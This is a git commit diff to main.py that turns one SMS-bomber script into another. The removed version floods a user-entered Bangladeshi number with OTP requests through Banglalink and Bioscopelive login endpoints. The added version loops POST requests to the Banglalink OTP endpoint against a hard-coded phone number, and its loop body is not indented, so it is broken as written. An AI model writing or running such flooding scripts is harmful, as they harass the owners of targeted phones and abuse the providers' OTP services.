788a8935c423457e7b5cea048ae85f10a622e530
Dsx7 <79498453+Dsx7@users.noreply.github.com>
2021-02-23 11:16:28 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,34 +1,14 @@
-import requests as rq
-import time
+import requests
 
-number  = str(input("[>] Enter The BD Number: "))
-amount = int(input("[>] Enter The Ammount: "))
+#POST
 
-sent, nsent = 0, 0
+myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
 
-for count in range(1, amount + 1):
-  try:
-      status = 0
-          if number.startswith("014") or number.startswith("019"):
-                r = rq.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": number})
-                      status = r.status_code
-    else:
-          url = f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{number}&operator=bd-otp"
-                r = rq.get(url)
-                      status = r.status_code
-    if status == 200:
-          print(f"[✓] {count} SMS Sent.")
-              time.sleep(1)
-                  sent += 1
-                      count += 1
-  except:
-        print(f"[×] {count} SMS Not Sent.")
-              time.sleep(10)
-                    count+=1
-  count += 1             
-totalhit  = amount
-nsent     = totalhit - sent
+number={'mobile':'01963529363'}
 
-print(f"[•] Total Hits : {totalhit}")
-print(f"[✓] Total Sent : {sent}")
-print(f"[×] Total Not Sent : {nsent}")
+amount=int(input(" Enter The Amount : "))
+
+for i in range(amount):
+requests.post(myblapi,data=number)
+print(str(i+1)+" SMS Sent ")
+
